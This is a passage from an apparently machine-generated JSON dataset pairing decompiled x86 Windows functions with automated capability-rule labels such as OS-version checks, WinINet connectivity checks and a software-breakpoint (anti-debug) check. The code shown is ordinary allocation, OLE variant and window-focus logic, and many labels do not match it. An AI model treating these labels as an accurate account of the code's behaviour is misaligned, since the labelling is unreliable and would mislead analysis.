extraout_ECX + 3, extraout_ECX + 5, extraout_ECX + 6);\n            piVar6 = *(unaff_EBP + -0x28);\n            *(unaff_EBP + -4) = 0;\n            if (iVar4 < 0) {\n                if (piVar6 != NULL) {\n                    (**(*piVar6 + 8))(piVar6);\n                }\n                goto code_r0x0041596e;\n            }\n            *(extraout_ECX + 7) = 0;\n            if (piVar6 != NULL) {\n                (**(*piVar6 + 8))(piVar6);\n            }\n        }\n        else {\n            *(extraout_ECX + 7) = 1;\n        }\n        iVar4 = extraout_ECX[3];\n        *(unaff_EBP + -0x34) = 0;\n        *(unaff_EBP + -4) = 2;\n        uVar5 = fcn.0042f804(iVar4 * 0x34);\n        *(unaff_EBP + -0x34) = uVar5;\n        *(unaff_EBP + -4) = 0;\n        if (*(unaff_EBP + -0x34) != 0) {\n            iVar4 = extraout_ECX[3];\n            *(unaff_EBP + -4) = 4;\n            iVar4 = fcn.0042f804(iVar4);\n            extraout_ECX[4] = iVar4;\n            uVar8 = 0;\n            iVar4 = extraout_ECX[4];\n            *(unaff_EBP + -4) = 0;\n            if (iVar4 != 0) {\n                *(unaff_EBP + -0x30) = *(unaff_EBP + -0x34);\n                *(unaff_EBP + -0x38) = 0;\ncode_r0x00415539:\n                if (extraout_ECX[3] <= uVar8) goto code_r0x0041584d;\n                *(uVar8 + extraout_ECX[4]) = 0;\n                iVar9 = uVar8 * 0x30;\n                iVar4 = extraout_ECX[5] + iVar9;\n                if ((extraout_ECX[9] <= *(iVar4 + 0x10) && *(iVar4 + 0x10) != extraout_ECX[9]) &&\n                   (*(iVar4 + 0x14) != 0xd)) {\n                    if (extraout_ECX[8] == 2) {\n                        uVar8 = *(unaff_EBP + -0x2c) + 3U & 0xfffffffc;\n                        *(unaff_EBP + -0x28) = uVar8 + 4;\n                        *(unaff_EBP + -0x2c) = uVar8 + 8;\n                        arg_24h = 0;\n                        fcn.00411724(*(unaff_EBP + -0x30), *(iVar4 + 8), *(iVar4 + 0x14), *(iVar4 + 0x10), \n                                     *(iVar4 + 0x16), *(iVar4 + 0x17), 0, 0, uVar8, *(unaff_EBP + -0x28), 0, 0, 1);\n                    }\n                    else {\n                        if (extraout_ECX[8] != 1) {\n                            if (*(unaff_EBP + -0x3d) == '\\0') {\n                                *(unaff_EBP + -0x5c) = 0x89;\n                                *(unaff_EBP + -0x58) = 0x8b;\n                                *(unaff_EBP + -0x50) = 0;\n                                *(unaff_EBP + -0x4c) = 0;\n                                fcn.004152f2(*(unaff_EBP + 8), unaff_EBP + -0x5c, unaff_EBP + -0x50, 2);\n                                if (*(unaff_EBP + -0x50) == 0) {\n                                    if (*(unaff_EBP + -0x4c) != 0) {\n                                        puVar7 = 0x440c1c;\n                                        goto code_r0x00415698;\n                                    }\n                                }\n                                else {\n                                    puVar7 = 0x440c2c;\ncode_r0x00415698:\n                                    *(unaff_EBP + -0x24) = *puVar7;\n                                    *(unaff_EBP + -0x20) = puVar7[1];\n                                    *(unaff_EBP + -0x1c) = puVar7[2];\n                                    *(unaff_EBP + -0x18) = puVar7[3];\n                                }\n                                *(unaff_EBP + -0x3d) = 1;\n                            }\n                            *(unaff_EBP + -0x44) = 0;\n                            *(unaff_EBP + -4) = 6;\n                            uVar5 = fcn.0042f804(0x14);\n                            *(unaff_EBP + -0x44) = uVar5;\n                            *(unaff_EBP + -4) = 0;\n                            if (*(unaff_EBP + -0x44) != 0) {\n                                puVar7 = unaff_EBP + -0x24;\n                                goto code_r0x0041576e;\n                            }\n                            iVar10 = *(unaff_EBP + -0x38);\n                            if (iVar10 != 0) {\n                                puVar7 = *(unaff_EBP + -0x34) + 0x14;\n                                do {\n                                    fcn.0042f834(*puVar7);\n                                    puVar7 = puVar7 + 0xd;\n                                    iVar10 = iVar10 + -1;\n                                } while (iVar10 != 0);\n                            }\n                            goto code_r0x0041574e;\n                        }\n                        *(iVar4 + 0x15) = *(iVar4 + 0x15) | 0x40;\n                        iVar4 = *(unaff_EBP + -0x38);\n                        *(extraout_ECX[5] + 0x10 + iVar9) = 4;\n                        *(iVar4 + extraout_ECX[4]) = 1;\n                        iVar4 = extraout_ECX[5];\n                        *(unaff_EBP + -0x28) = iVar4 + iVar9;\n                        iVar4 = fcn.004117f5(*(iVar4 + iVar9 + 0x14));\n                        arg_24h = iVar4 + -1 + *(unaff_EBP + -0x2c) & ~(iVar4 - 1U);\n                        iVar4 = *(unaff_EBP + -0x28);\n                        uVar8 = *(iVar4 + 0x10) + 3 + arg_24h & 0xfffffffc;\n                        *(unaff_EBP + -0x28) = uVar8 + 4;\n                        *(unaff_EBP + -0x2c) = uVar8 + 8;\n                        fcn.00411724(*(unaff_EBP + -0x30), *(iVar4 + 8), *(iVar4 + 0x14), *(iVar4 + 0x10), \n                                     *(iVar4 + 0x16), *(iVar4 + 0x17), 0, arg_24h, uVar8, *(unaff_EBP + -0x28), 0, 0, 0)\n                        ;\n                    }\n                    goto code_r0x00415837;\n                }\n                if (*(iVar4 + 0x14) == 0xd) {\n                    *(unaff_EBP + -0x44) = 0;\n                    *(unaff_EBP + -4) = 8;\n                    uVar5 = fcn.0042f804(0x14);\n                    *(unaff_EBP + -0x44) = uVar5;\n                    *(unaff_EBP + -4) = 0;\n                    if (*(unaff_EBP + -0x44) == 0) {\n                        iVar10 = *(unaff_EBP + -0x38);\n                        if (iVar10 != 0) {\n                            puVar7 = *(unaff_EBP + -0x34) + 0x14;\n                            do {\n                                fcn.0042f834(*puVar7);\n                                puVar7 = puVar7 + 0xd;\n                                iVar10 = iVar10 + -1;\n                            } while (iVar10 != 0);\n                        }\ncode_r0x0041574e:\n                        fcn.0042f834(*(unaff_EBP + -0x34));\n                        fcn.0042f834(extraout_ECX[4]);\n                        extraout_ECX[4] = 0;\n                        goto code_r0x004154e8;\n                    }\n                    puVar7 = 0x440c0c;\ncode_r0x0041576e:\n                    puVar3 = *(unaff_EBP + -0x44);\n                    *puVar3 = 0;\n                    puVar3[1] = *puVar7;\n                    puVar3[2] = puVar7[1];\n                    puVar3[3] = puVar7[2];\n                    puVar3[4] = puVar7[3];\n                    iVar9 = *(unaff_EBP + -0x38) * 0x30;\n                    *(extraout_ECX[5] + 0x14 + iVar9) = 0xd;\n                    *(extraout_ECX[5] + 0x10 + iVar9) = 4;\n                    iVar4 = extraout_ECX[5];\n                    *(unaff_EBP + -0x28) = iVar4 + iVar9;\n                    iVar4 = fcn.004117f5(*(iVar4 + iVar9 + 0x14));\n                    uVar5 = *(unaff_EBP + -0x44);\n                }\n                else {\n                    if (*(iVar4 + 0x14) == 0x81) {\n                        *(iVar4 + 0x10) = *(iVar4 + 0x10) + 1;\n                    }\n                    iVar4 = extraout_ECX[5] + iVar9;\n                    if (*(iVar4 + 0x14) == 0x82) {\n                        *(iVar4 + 0x10) = *(iVar4 + 0x10) * 2 + 2;\n                    }\n                    iVar4 = extraout_ECX[5];\n                    *(unaff_EBP + -0x28) = iVar4 + iVar9;\n                    iVar4 = fcn.004117f5(*(iVar4 + iVar9 + 0x14));\n                    uVar5 = 0;\n                }\n                arg_24h = iVar4 + -1 + *(unaff_EBP + -0x2c) & ~(iVar4 - 1U);\n                iVar4 = *(unaff_EBP + -0x28);\n                uVar8 = *(iVar4 + 0x10) + 3 + arg_24h & 0xfffffffc;\n                arg_2ch = uVar8 + 4;\n                uVar1 = *(iVar4 + 0x17);\n                *(unaff_EBP + -0x2c) = arg_2ch;\n                *(unaff_EBP + -0x2c) = *(unaff_EBP + -0x2c) + 4;\n                *(unaff_EBP + -0x28) = arg_2ch;\n                fcn.00411644(*(unaff_EBP + -0x30), *(iVar4 + 8), *(iVar4 + 0x14), *(iVar4 + 0x10), *(iVar4 + 0x16), \n                             uVar1, 0, arg_24h, uVar8, arg_2ch, uVar5);\ncode_r0x00415837:\n                *(unaff_EBP + -0x30) = *(unaff_EBP + -0x30) + 0x34;\n                iVar4 = extraout_ECX[5];\n                *(unaff_EBP + -0x38) = *(unaff_EBP + -0x38) + 1;\n                *(iVar4 + 4 + iVar9) = arg_24h;\n                uVar8 = *(unaff_EBP + -0x38);\n                goto code_r0x00415539;\n            }\n            fcn.0042f834(*(unaff_EBP + -0x34));\n            goto code_r0x0041591a;\n        }\ncode_r0x004154e8:\n        piVar6 = *(unaff_EBP + -0x3c);\n        *(unaff_EBP + -4) = 0xffffffff;\n        goto code_r0x00415924;\n    }\n    piVar6 = *(unaff_EBP + -0x3c);\n    *(unaff_EBP + -4) = 0xffffffff;\n    goto code_r0x00415977;\ncode_r0x0041584d:\n    if (*extraout_ECX == 0) {\n        iVar10 = fcn.00411596(1, 1, uVar11, iVar10, var_5ch, var_58h);\n        *(unaff_EBP + -0x38) = iVar10;\n        if (iVar10 < 0) {\n            uVar8 = 0;\n            if (extraout_ECX[3] != 0) {\n                puVar7 = *(unaff_EBP + -0x34) + 0x14;\n                do {\n                    fcn.0042f834(*puVar7);\n                    uVar8 = uVar8 + 1;\n                    puVar7 = puVar7 + 0xd;\n                } while (uVar8 < extraout_ECX[3]);\n            }\n            fcn.0042f834(*(unaff_EBP + -0x34));\n            fcn.0042f834(extraout_ECX[4]);\n            piVar6 = *(unaff_EBP + -0x3c);\n            extraout_ECX[4] = 0;\n            *(unaff_EBP + -4) = 0xffffffff;\ncode_r0x0041589f:\n            if (piVar6 != NULL) {\n                (**(*piVar6 + 8))(piVar6);\n            }\n            goto code_r0x00415981;\n        }\n        *(*extraout_ECX + 4) = 1;\n    }\n    uVar11 = *(unaff_EBP + -0x2c);\n    extraout_ECX[2] = 0;\n    *(unaff_EBP + -4) = 10;\n    iVar10 = fcn.0042f804(uVar11);\n    extraout_ECX[2] = iVar10;\n    iVar10 = extraout_ECX[2];\n    uVar8 = 0;\n    *(unaff_EBP + -4) = 0;\n    if (iVar10 == 0) {\n        if (extraout_ECX[3] != 0) {\n            puVar7 = *(unaff_EBP + -0x34) + 0x14;\n            do {\n                fcn.0042f834(*puVar7);\n                uVar8 = uVar8 + 1;\n                puVar7 = puVar7 + 0xd;\n            } while (uVar8 < extraout_ECX[3]);\n        }\n        fcn.0042f834(*(unaff_EBP + -0x34));\n        fcn.0042f834(extraout_ECX[4]);\n        extraout_ECX[4] = 0;\ncode_r0x0041591a:\n        piVar6 = *(unaff_EBP + -0x3c);\n        *(unaff_EBP + -4) = 0xffffffff;\ncode_r0x00415924:\n        if (piVar6 != NULL) {\n            (**(*piVar6 + 8))(piVar6);\n        }\n        goto code_r0x00415981;\n    }\n    fcn.004192e0(iVar10, 0, *(unaff_EBP + -0x2c));\n    iVar10 = fcn.004115fa(*(unaff_EBP + -0x34), extraout_ECX[3], *extraout_ECX, *(unaff_EBP + -0x2c), \n                          *(unaff_EBP + -0x3c));\n    if (iVar10 < 0) {\n        fcn.0042f834(extraout_ECX[4]);\n        extraout_ECX[4] = 0;\n    }\n    fcn.0042f834(*(unaff_EBP + -0x34));\ncode_r0x0041596e:\n    piVar6 = *(unaff_EBP + -0x3c);\n    *(unaff_EBP + -4) = 0xffffffff;\ncode_r0x00415977:\n    if (piVar6 != NULL) {\n        (**(*piVar6 + 8))(piVar6);\n    }\ncode_r0x00415981:\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    fcn.004192ca();\n    return;\n}\n",
        "token_count": 4661
    },
    "00415d7b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00415d7b(int32_t **param_1)\n\n{\n    int32_t *piVar1;\n    \n    if (param_1[4] != NULL) {\n        if (*param_1 != NULL) {\n            fcn.004152d7(*param_1);\n        }\n        piVar1 = param_1[4];\n        if (piVar1 != NULL) {\n            fcn.004148ff();\n            fcn.0042f834(piVar1);\n        }\n        param_1[4] = NULL;\n    }\n    if (*param_1 != NULL) {\n        fcn.00412c48();\n        piVar1 = *param_1;\n        if (piVar1 != NULL) {\n            *param_1 = NULL;\n            (**(*piVar1 + 8))(piVar1);\n        }\n        piVar1 = param_1[1];\n        if (piVar1 != NULL) {\n            param_1[1] = NULL;\n            (**(*piVar1 + 8))(piVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 240
    },
    "00416533": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_13ch\n// WARNING: Variable defined which should be unmapped: var_130h\n\nvoid __cdecl fcn.00416533(uint arg_8h, uint arg_ch)\n\n{\n    char *pcVar1;\n    uchar uVar2;\n    uint16_t uVar3;\n    uint uVar4;\n    double dVar5;\n    code *pcVar6;\n    char cVar7;\n    ulong *puVar8;\n    uint *puVar9;\n    uint uVar10;\n    int16_t *piVar11;\n    uchar *puVar12;\n    int32_t iVar13;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_13ch;\n    uint var_130h;\n    uint var_120h;\n    uint var_110h;\n    uint var_100h;\n    uint var_f0h;\n    uint var_e0h;\n    uint var_d0h;\n    uint var_c0h;\n    uint var_b0h;\n    uint var_a0h;\n    uint var_90h;\n    uint var_80h;\n    uint var_70h;\n    uint var_60h;\n    uint var_58h;\n    uint var_50h;\n    uint var_48h;\n    uint var_44h;\n    uint pvargDest;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_18h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00419340();\n    *(unaff_EBP + -0x10) = *0x44d270;\n    *(unaff_EBP + -0x30) = 0;\n    fcn.00417aa1(unaff_EBP + -0x40);\n    *(unaff_EBP + -4) = 0;\n    fcn.00414136(*(unaff_EBP + 0xc), unaff_EBP + -0x28);\n    if ((*(unaff_EBP + -0x28) == 3) ||\n       (cVar7 = fcn.00412e35(*(unaff_EBP + 0xc), unaff_EBP + -0x26),  pcVar6 = _sym.imp.OLEAUT32.dll_VariantCopy, \n       cVar7 == '\\0')) {\n        fcn.00417ab4(unaff_EBP + -0x40);\n        (*_sym.imp.OLEAUT32.dll_VariantCopy)(unaff_EBP + -0x40);\n        goto code_r0x00416a3f;\n    }\n    uVar3 = *(unaff_EBP + -0x26);\n    if (uVar3 < 0x82) {\n        if (uVar3 != 0x81) {\n            if (uVar3 < 9) {\n                if (uVar3 == 8) goto code_r0x004169e2;\n                if (uVar3 == 2) {\ncode_r0x00416731:\n                    piVar11 = fcn.00412e69(*(unaff_EBP + 0xc));\n                    uVar10 = fcn.004179d0(*piVar11, 2);\n                    *(unaff_EBP + -4) = 7;\n                    fcn.00417a87(uVar10);\n                    iVar13 = unaff_EBP + -0x110;\n                }\n                else if (uVar3 == 3) {\ncode_r0x00416700:\n                    puVar9 = fcn.00412e69(*(unaff_EBP + 0xc));\n                    uVar10 = fcn.004179f7(*puVar9, 3);\n                    *(unaff_EBP + -4) = 8;\n                    fcn.00417a87(uVar10);\n                    iVar13 = unaff_EBP + -0xe0;\n                }\n                else if (uVar3 == 4) {\n                    puVar9 = fcn.00412e69(*(unaff_EBP + 0xc));\n                    *(unaff_EBP + -0xb8) = *puVar9;\n                    *(unaff_EBP + -0xc0) = 4;\n                    *(unaff_EBP + -4) = 9;\n                    fcn.00417a87(unaff_EBP + -0xc0);\n                    iVar13 = unaff_EBP + -0xc0;\n                }\n                else if (uVar3 == 5) {\n                    puVar8 = fcn.00412e69(*(unaff_EBP + 0xc));\n                    *(unaff_EBP + -0x88) = *puVar8;\n                    *(unaff_EBP + -0x90) = 5;\n                    *(unaff_EBP + -4) = 10;\n                    fcn.00417a87(unaff_EBP + -0x90);\n                    iVar13 = unaff_EBP + -0x90;\n                }\n                else if (uVar3 == 6) {\n                    puVar9 = fcn.00412e69(*(unaff_EBP + 0xc));\n                    uVar10 = *puVar9;\n                    uVar4 = puVar9[1];\n                    *(unaff_EBP + -0x50) = 6;\n                    *(unaff_EBP + -0x48) = uVar10;\n                    *(unaff_EBP + -0x44) = uVar4;\n                    *(unaff_EBP + -4) = 0xd;\n                    fcn.00417a87(unaff_EBP + -0x50);\n                    iVar13 = unaff_EBP + -0x50;\n                }\n                else {\n                    if (uVar3 != 7) goto code_r0x00416a2d;\n                    puVar8 = fcn.00412e69(*(unaff_EBP + 0xc));\n                    *(unaff_EBP + -200) = *puVar8;\n                    *(unaff_EBP + -0xd0) = 7;\n                    *(unaff_EBP + -4) = 0xc;\n                    fcn.00417a87(unaff_EBP + -0xd0);\n                    iVar13 = unaff_EBP + -0xd0;\n                }\n            }\n            else if (uVar3 == 0xb) {\n                piVar11 = fcn.00412e69(*(unaff_EBP + 0xc));\n                uVar10 = fcn.004179d0(*piVar11, 0xb);\n                *(unaff_EBP + -4) = 0xb;\n                fcn.00417a87(uVar10);\n                iVar13 = unaff_EBP + -0x100;\n            }\n            else {\n                if (uVar3 != 0xc) {\n                    if (0xf < uVar3) {\n                        if (uVar3 < 0x12) {\n                            puVar12 = fcn.00412e69(*(unaff_EBP + 0xc));\n                            uVar2 = *puVar12;\n                            *(unaff_EBP + -0x60) = 0x11;\n                            *(unaff_EBP + -0x58) = uVar2;\n                            *(unaff_EBP + -4) = 6;\n                            fcn.00417a87(unaff_EBP + -0x60);\n                            iVar13 = unaff_EBP + -0x60;\n                            goto code_r0x004168c4;\n                        }\n                        if (uVar3 == 0x12) goto code_r0x00416731;\n                        if (uVar3 == 0x13) goto code_r0x00416700;\n                    }\n                    goto code_r0x00416a2d;\n                }\n                uVar10 = fcn.00412e69(*(unaff_EBP + 0xc));\n                uVar10 = fcn.00417ab4(uVar10);\n                *(unaff_EBP + -4) = 1;\n                fcn.00417a87(uVar10);\n                iVar13 = unaff_EBP + -0xf0;\n            }\n            goto code_r0x004168c4;\n        }\n        uVar10 = fcn.00412e69(*(unaff_EBP + 0xc));\n        puVar9 = fcn.0040cde0(uVar10);\n        uVar10 = *puVar9;\n        *(unaff_EBP + -4) = 2;\n        uVar10 = fcn.00417ad4(uVar10, 8);\n        *(unaff_EBP + -4) = 3;\n        fcn.00417a87(uVar10);\n        (*pcVar6)(unaff_EBP + -0x120);\ncode_r0x00416a22:\n        *(unaff_EBP + -4) = 0;\n        fcn.004014f0();\n    }\n    else {\n        if (uVar3 == 0x82) {\ncode_r0x004169e2:\n            uVar10 = fcn.00412e69(*(unaff_EBP + 0xc));\n            puVar9 = fcn.00415f9f(uVar10);\n            uVar10 = *puVar9;\n            *(unaff_EBP + -4) = 4;\n            uVar10 = fcn.00417ad4(uVar10, 8);\n            *(unaff_EBP + -4) = 5;\n            fcn.00417a87(uVar10);\n            (*pcVar6)(unaff_EBP + -0x130);\n            goto code_r0x00416a22;\n        }\n        if (uVar3 == 0x83) {\n            cVar7 = fcn.00413eb4(*(unaff_EBP + 0xc), unaff_EBP + -0x24);\n            if (cVar7 != '\\0') {\n                dVar5 = *(unaff_EBP + -0x21);\n                cVar7 = *(unaff_EBP + -0x23);\n                while (cVar7 != '\\0') {\n                    pcVar1 = unaff_EBP + -0x23;\n                    *pcVar1 = *pcVar1 + -1;\n                    dVar5 = dVar5 * *0x440d88;\n                    cVar7 = *pcVar1;\n                }\n                if (*(unaff_EBP + -0x22) == '\\0') {\n                    dVar5 = -dVar5;\n                }\n                *(unaff_EBP + -0x78) = dVar5;\n                *(unaff_EBP + -0x80) = 5;\n                *(unaff_EBP + -4) = 0xe;\n                fcn.00417a87(unaff_EBP + -0x80);\n                iVar13 = unaff_EBP + -0x80;\n                goto code_r0x004168c4;\n            }\n        }\n        else if (uVar3 == 0x85) {\n            cVar7 = fcn.00413ede(*(unaff_EBP + 0xc), unaff_EBP + -0x30);\n            if (cVar7 != '\\0') {\n                *(unaff_EBP + -0x20) = 0;\n                *(unaff_EBP + -0x18) = 0;\n                fcn.00412d6c(*(unaff_EBP + -0x30), *(unaff_EBP + -0x2e), *(unaff_EBP + -0x2c), 0, 0, 0);\n                *(unaff_EBP + -0x70) = 7;\n                *(unaff_EBP + -0x68) = *(unaff_EBP + -0x20);\n                *(unaff_EBP + -4) = 0xf;\n                fcn.00417a87(unaff_EBP + -0x70);\n                iVar13 = unaff_EBP + -0x70;\n                goto code_r0x004168c4;\n            }\n        }\n        else if (uVar3 == 0x86) {\n            cVar7 = fcn.00413ede(*(unaff_EBP + 0xc), unaff_EBP + -0x30);\n            if (cVar7 != '\\0') {\n                *(unaff_EBP + -0x20) = 0;\n                *(unaff_EBP + -0x18) = 0;\n                fcn.00412dcd(*(unaff_EBP + -0x30), *(unaff_EBP + -0x2e), *(unaff_EBP + -0x2c));\n                *(unaff_EBP + -0xb0) = 7;\n                *(unaff_EBP + -0xa8) = *(unaff_EBP + -0x20);\n                *(unaff_EBP + -4) = 0x10;\n                fcn.00417a87(unaff_EBP + -0xb0);\n                iVar13 = unaff_EBP + -0xb0;\n                goto code_r0x004168c4;\n            }\n        }\n        else if ((uVar3 == 0x87) && (cVar7 = fcn.00413f08(*(unaff_EBP + 0xc), unaff_EBP + -0x24),  cVar7 != '\\0')) {\n            puVar8 = fcn.0041409e(*(unaff_EBP + -0x24), *(unaff_EBP + -0x22), *(unaff_EBP + -0x20), *(unaff_EBP + -0x1e)\n                                  , *(unaff_EBP + -0x1c), *(unaff_EBP + -0x1a));\n            *(unaff_EBP + -0xa0) = 7;\n            *(unaff_EBP + -0x98) = *puVar8;\n            *(unaff_EBP + -4) = 0x11;\n            fcn.00417a87(unaff_EBP + -0xa0);\n            iVar13 = unaff_EBP + -0xa0;\ncode_r0x004168c4:\n            *(unaff_EBP + -4) = 0;\n            (*pcVar6)(iVar13);\n        }\n    }\ncode_r0x00416a2d:\n    fcn.00417ab4(unaff_EBP + -0x40);\n    (*pcVar6)(unaff_EBP + -0x40);\ncode_r0x00416a3f:\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    fcn.004192ca();\n    return;\n}\n",
        "token_count": 3209
    },
    "00416e16": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.00416e16(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    if (*param_1 == 0) {\n        if ((param_1[1] != 0) && (uVar2 = (**(*param_1[1] + 0x78))(),  (uVar2 & 0x8000000) != 0)) {\n            return 0;\n        }\n    }\n    else {\n        iVar1 = (*_sym.imp.USER32.dll_IsWindowEnabled)(*param_1);\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    if ((param_1[1] != 0) && ((*(param_1[1] + 0x6d) & 0x20) != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 200
    },
    "0041700f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.0041700f(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t **ppiVar3;\n    \n    piVar2 = fcn.0042c022();\n    if (piVar2 != NULL) {\n        iVar1 = piVar2[0x10];\n        do {\n            if (iVar1 == 0) {\n                return NULL;\n            }\n            ppiVar3 = fcn.0040e765();\n            piVar2 = *ppiVar3;\n        } while (*piVar2 != *(arg_ch + 0x1c));\n    }\n    return piVar2;\n}\n",
        "token_count": 158
    },
    "00417050": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00417050(uint arg_8h, int32_t *arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t **ppiVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t *piVar7;\n    \n    piVar7 = arg_ch;\n    arg_ch = NULL;\n    piVar3 = piVar7;\n    if ((piVar7 != NULL) && (*piVar7 != 0)) {\n        uVar1 = fcn.0042cb01(*piVar7);\n        iVar2 = fcn.00416ee0(arg_8h, uVar1);\n        if (iVar2 != 0) {\n            piVar3 = fcn.0041700f(arg_8h, iVar2);\n        }\n    }\n    while (((piVar3 = fcn.0042f076(piVar3),  piVar3 != NULL && (arg_ch = arg_ch + 1,  piVar3 != piVar7)) &&\n           (arg_ch < 0x3d))) {\n        iVar2 = fcn.00416df7(piVar3, arg_10h);\n        if (iVar2 != 0) {\n            return piVar3;\n        }\n    }\n    iVar2 = fcn.0042c022();\n    if (iVar2 != 0) {\n        arg_ch = *(iVar2 + 0x40);\n        if (piVar7 == NULL) {\n            ppiVar4 = fcn.0040e765(&arg_ch);\n            piVar3 = *ppiVar4;\n            piVar7 = piVar3;\n        }\n        else {\n            piVar3 = NULL;\n            if (arg_ch == NULL) {\n                return NULL;\n            }\n            do {\n                if (piVar3 == piVar7) break;\n                ppiVar4 = fcn.0040e765();\n                piVar3 = *ppiVar4;\n            } while (arg_ch != NULL);\n        }\n        if (((arg_ch != NULL) && (piVar3 != NULL)) && (piVar7 != NULL)) {\n            do {\n                if (arg_ch == NULL) {\n                    arg_ch = *(iVar2 + 0x40);\n                }\n                ppiVar4 = fcn.0040e765(&arg_ch);\n                piVar3 = *ppiVar4;\n                iVar5 = fcn.00416df7(piVar3, arg_10h);\n                if (iVar5 != 0) {\n                    if (*piVar3 == 0) {\n                        uVar6 = (**(*piVar3[1] + 0x78))();\n                        if ((uVar6 & 0x8000000) == 0) {\n                            return piVar3;\n                        }\n                    }\n                    else {\n                        iVar5 = (*_sym.imp.USER32.dll_IsWindowEnabled)(*piVar3);\n                        if (iVar5 != 0) {\n                            return piVar3;\n                        }\n                    }\n                }\n            } while (piVar3 != piVar7);\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 692
    },
    "0041716d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.0041716d(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t **ppiVar3;\n    int32_t iVar4;\n    int32_t *arg_ch_00;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t *var_4h;\n    \n    var_4h = NULL;\n    piVar1 = fcn.0041700f(arg_8h, arg_ch);\n    arg_ch_00 = piVar1;\n    if ((piVar1 == NULL) && (iVar2 = fcn.0042c022(),  iVar2 != 0)) {\n        iVar5 = *(iVar2 + 0x40);\n        while (arg_ch_00 = piVar1,  iVar5 != 0) {\n            ppiVar3 = fcn.0040e765();\n            arg_ch_00 = *ppiVar3;\n            if (((*arg_ch_00 != 0) && (iVar4 = (*_sym.imp.USER32.dll_GetFocus)(),  *arg_ch_00 == iVar4)) ||\n               ((arg_ch_00[1] != 0 && (arg_ch_00[1] == *(iVar2 + 0x6c))))) break;\n        }\n    }\n    iVar2 = 0;\n    do {\n        arg_ch_00 = fcn.00417050(arg_8h, arg_ch_00, arg_10h);\n        if (arg_ch_00 == NULL) {\n            return NULL;\n        }\n        iVar5 = fcn.00416e16(arg_ch_00);\n        if ((iVar5 != 0) && (arg_ch_00 = fcn.0042ee9e(arg_ch_00, 0),  arg_ch_00 == NULL)) {\n            return NULL;\n        }\n        if (*arg_ch_00 == 0) {\n            uVar6 = (**(*arg_ch_00[1] + 0x78))();\n            uVar6 = uVar6 & 0x8000000;\n        }\n        else {\n            uVar6 = (*_sym.imp.USER32.dll_IsWindowEnabled)(*arg_ch_00);\n        }\n        if (uVar6 == 0) {\n            return arg_ch_00;\n        }\n        if (arg_ch_00 == var_4h) {\n            return NULL;\n        }\n        if (var_4h == NULL) {\n            var_4h = arg_ch_00;\n        }\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 0x200);\n    return NULL;\n}\n",
        "token_count": 588
    },
    "0042ed32": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042ed32(int32_t param_1)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 0x4c) == 0) {\n        uVar1 = (*_sym.imp.USER32.dll_SetFocus)(*(param_1 + 0x1c));\n        fcn.0042cb01(uVar1);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0042ed4d. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x4c) + 0xb0))();\n    return;\n}\n",
        "token_count": 147
    },
    "00417463": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
